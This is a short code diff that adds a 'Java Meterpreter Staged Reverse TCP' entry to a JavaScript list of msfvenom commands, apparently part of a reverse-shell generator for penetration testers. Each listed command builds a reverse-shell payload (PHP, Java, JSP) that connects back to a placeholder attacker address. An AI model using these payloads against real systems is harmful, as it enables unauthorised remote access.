@@ -449,6 +449,11 @@ const msfvenomCommands =  withCommandType(
             "command": "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php",
             "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
         },
+	{
+            "name": "Java Meterpreter Staged Reverse TCP",
+            "command": "msfvenom -p java/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jar",
+            "meta": ["msfvenom", "windows", "linux", "meterpreter", "staged", "reverse"]
+        },
         {
             "name": "JSP Stageless Reverse TCP",
             "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp",
